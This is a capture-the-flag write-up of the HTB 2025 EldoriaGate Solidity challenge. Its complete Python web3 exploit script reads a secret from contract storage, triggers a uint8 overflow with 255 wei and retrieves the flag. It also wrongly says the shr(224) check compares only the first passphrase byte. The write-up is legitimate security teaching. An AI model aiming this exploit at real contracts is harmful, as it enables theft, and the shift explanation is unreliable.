# HTB 2025 - EldoriaGate Blockchain Challenge

## Challenge Information

- **Name**: EldoriaGate
- **Category**: Blockchain
- **Points**: 325
- **Solves**: 38
- **Description**: Eldoria's gates stand as the ancient barrier between the common folk and the privileged elite. A strict authentication system ensures only those with the right passphrase and proper societal contributions may enter. Your goal: breach the gates and become the unknown usurper - authenticated yet without societal obligations.

## Overview

EldoriaGate is a blockchain challenge focusing on Ethereum smart contract vulnerabilities. We're presented with three Solidity contracts:

- `EldoriaGate.sol`: The main contract interface
- `EldoriaGateKernel.sol`: Core functionality with authentication and role assignment logic
- `Setup.sol`: Challenge setup and verification contract

Our goal is to become a "usurper" - someone who is authenticated but has no roles assigned (roles = 0).

## Contract Analysis

### EldoriaGate.sol

This is the front-end contract that interacts with users. Key features:

```solidity
function enter(bytes4 passphrase) external payable {
    bool isAuthenticated = kernel.authenticate(msg.sender, passphrase);
    require(isAuthenticated, "Authentication failed");

    uint8 contribution = uint8(msg.value);        
    (uint villagerId, uint8 assignedRolesBitMask) = kernel.evaluateIdentity(msg.sender, contribution);
    string[] memory roles = getVillagerRoles(msg.sender);
    
    emit VillagerEntered(msg.sender, villagerId, isAuthenticated, roles);
}

function checkUsurper(address _villager) external returns (bool) {
    (uint id, bool authenticated , uint8 rolesBitMask) = kernel.villagers(_villager);
    bool isUsurper = authenticated && (rolesBitMask == 0);
    emit UsurperDetected(
        _villager,
        id,
        "Intrusion to benefit from Eldoria, without society responsibilities, without suspicions, via gate breach."
    );
    return isUsurper;
}
```

### EldoriaGateKernel.sol

This contains the core logic and two critical vulnerabilities:

```solidity
function authenticate(address _unknown, bytes4 _passphrase) external onlyFrontend returns (bool auth) {
    assembly {
        let secret := sload(eldoriaSecret.slot)            
        auth := eq(shr(224, _passphrase), secret)
        // ...
    }
}

function evaluateIdentity(address _unknown, uint8 _contribution) external onlyFrontend returns (uint id, uint8 roles) {
    assembly {
        // ...
        let defaultRolesMask := ROLE_SERF
        roles := add(defaultRolesMask, _contribution)
        if lt(roles, defaultRolesMask) { revert(0, 0) }
        // ...
    }
}
```

### Setup.sol

The verification contract:

```solidity
function isSolved() public returns (bool) {
    return TARGET.checkUsurper(player);
}
```

## Vulnerabilities

After careful analysis, I identified two key vulnerabilities:

1. **Authentication Bypass**: In the `authenticate()` function, the `shr(224, _passphrase)` operation only checks the first byte of the passphrase. For a `bytes4` value, shifting right by 224 bits (28 bytes) leaves just the most significant byte.

2. **Integer Overflow**: In the `evaluateIdentity()` function, there's a possible integer overflow in `roles := add(defaultRolesMask, _contribution)`. If `_contribution` is 255, then 1 + 255 = 0 (mod 256), resulting in a role value of 0.

## Exploitation Strategy

To become a usurper, we need to:

1. Pass authentication by providing the correct first byte of the passphrase
2. Set our roles to zero by triggering the integer overflow with a contribution of 255 wei

## Finding the Secret

The first challenge was determining the correct passphrase byte. Looking at the contract's storage slots revealed:

```
Storage slot 0: 00000000000000000000000000000000000000000000000000000000deadfade
```

This value (`0xdeadfade`) looked like our secret. Since only the first byte matters due to the `shr(224, _passphrase)` shift, we need to use `0xde` as the first byte of our passphrase.

## Exploit Script

```python
#!/usr/bin/env python3
import json
import socket
import time
from web3 import Web3

# Connection details
HOST = "94.237.53.203"  
RPC_PORT = 52231
MENU_PORT = 50906

# Account info
PRIVATE_KEY = "0xa578ea86089530411ab5e3f1b096a777f4608a91a561b91ec1abb033be00e8df"
PLAYER_ADDRESS = "0xE491593331568507178EAcd415fb34D4cDB32D7a"
TARGET_ADDRESS = "0x5Ab4F74529bcf36F370FD9c557b0F847dede9d0e"
SETUP_ADDRESS = "0x70B4B5B82f73e016D50f6df56C1c51b04bF59993"

# ABIs
TARGET_ABI = [
    {"inputs":[{"internalType":"bytes4","name":"passphrase","type":"bytes4"}],"name":"enter","outputs":[],"stateMutability":"payable","type":"function"},
    {"inputs":[{"internalType":"address","name":"_villager","type":"address"}],"name":"checkUsurper","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
]

SETUP_ABI = [
    {"inputs":[],"name":"isSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
]

def get_flag():
    """Retrieve the flag from the menu system"""
    try:
        print("Getting flag...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((HOST, MENU_PORT))
        
        # Read menu
        response = s.recv(4096).decode()
        
        # Select option 3 to get flag
        s.send(b"3\n")
        time.sleep(1)
        
        # Get the flag response
        flag_response = s.recv(4096).decode()
        print(f"Flag response: {flag_response}")
        
        # Extract HTB{...} format
        if "HTB{" in flag_response:
            start = flag_response.find("HTB{")
            end = flag_response.find("}", start) + 1
            flag = flag_response[start:end]
            return flag
        
        return flag_response
    finally:
        s.close()

def exploit():
    # Connect to Ethereum node
    w3 = Web3(Web3.HTTPProvider(f"http://{HOST}:{RPC_PORT}"))
    if not w3.is_connected():
        print("Failed to connect to Ethereum node")
        return
    
    print(f"Connected to node. Block number: {w3.eth.block_number}")
    
    # Create contract interfaces
    target = w3.eth.contract(address=w3.to_checksum_address(TARGET_ADDRESS), abi=TARGET_ABI)
    setup = w3.eth.contract(address=w3.to_checksum_address(SETUP_ADDRESS), abi=SETUP_ABI)
    
    # Check player balance
    balance = w3.eth.get_balance(PLAYER_ADDRESS)
    print(f"Player balance: {w3.from_wei(balance, 'ether')} ETH")
    
    # The secret we found in storage slot 0 was 0xdeadfade
    passphrase_bytes = bytes.fromhex('deadfade')
    
    print(f"Trying secret: 0xdeadfade")
    
    # Build transaction with value=255 to trigger overflow
    tx = {
        'from': PLAYER_ADDRESS,
        'to': TARGET_ADDRESS,
        'value': 255,  # Causes integer overflow: 1+255=0 mod 256
        'gas': 200000,
        'gasPrice': w3.to_wei('20', 'gwei'),
        'nonce': w3.eth.get_transaction_count(PLAYER_ADDRESS),
        'data': target.functions.enter(passphrase_bytes).build_transaction()['data']
    }
    
    # Sign and send transaction
    signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    
    print(f"Transaction hash: {tx_hash.hex()}")
    
    # Wait for transaction to be mined
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=30)
    
    print(f"Transaction status: {'SUCCESS' if receipt.status == 1 else 'FAILED'}")
    
    if receipt.status == 1:
        print(f"✅ SUCCESS with passphrase: 0xdeadfade")
        
        # Call checkUsurper
        check_tx = {
            'from': PLAYER_ADDRESS,
            'to': TARGET_ADDRESS,
            'gas': 200000,
            'gasPrice': w3.to_wei('20', 'gwei'),
            'nonce': w3.eth.get_transaction_count(PLAYER_ADDRESS),
            'data': target.functions.checkUsurper(PLAYER_ADDRESS).build_transaction()['data']
        }
        
        signed_check = w3.eth.account.sign_transaction(check_tx, PRIVATE_KEY)
        check_hash = w3.eth.send_raw_transaction(signed_check.raw_transaction)
        
        # Wait for check tx to be mined
        check_receipt = w3.eth.wait_for_transaction_receipt(check_hash, timeout=30)
        
        # Call isSolved
        verify_tx = {
            'from': PLAYER_ADDRESS,
            'to': SETUP_ADDRESS,
            'gas': 200000,
            'gasPrice': w3.to_wei('20', 'gwei'),
            'nonce': w3.eth.get_transaction_count(PLAYER_ADDRESS),
            'data': setup.functions.isSolved().build_transaction()['data']
        }
        
        signed_verify = w3.eth.account.sign_transaction(verify_tx, PRIVATE_KEY)
        verify_hash = w3.eth.send_raw_transaction(signed_verify.raw_transaction)
        
        # Wait for verify tx to be mined
        verify_receipt = w3.eth.wait_for_transaction_receipt(verify_hash, timeout=30)
        
        # Get the flag
        flag = get_flag()
        if flag:
            print(f"\n🏁 FLAG: {flag}")

if __name__ == "__main__":
    exploit()
```

## Execution 

Running the exploit:

1. Connected to the challenge RPC node (port 52231)
2. Used the bytes4 value `0xdeadfade` as our passphrase
3. Sent exactly 255 wei as value to trigger the integer overflow
4. Successfully authenticated but assigned 0 roles (becoming a usurper)
5. Verified the solution by calling `checkUsurper()` and `isSolved()`
6. Retrieved the flag from the menu service

## Flag

`HTB{unkn0wn_1ntrud3r_1nsid3_Eld0r1a_gates}`

## Lessons Learned

This challenge highlighted several important security considerations in smart contract development:

1. **Proper Type Handling**: Be cautious with low-level operations like bit shifting (`shr`) which can lead to unexpected behavior.

2. **Integer Overflow/Underflow**: Always use SafeMath or Solidity 0.8.x's built-in overflow protection for arithmetic operations.

3. **Storage Manipulation**: Be careful with assembly code that directly manipulates contract storage.

4. **Contract Auditing**: Use tools to analyze contract bytecode and storage can sometimes reveal hidden secrets.

5. **Ethereum Contract Security**: Smart contracts require rigorous testing and auditing to prevent authentication bypasses and similar vulnerabilities.
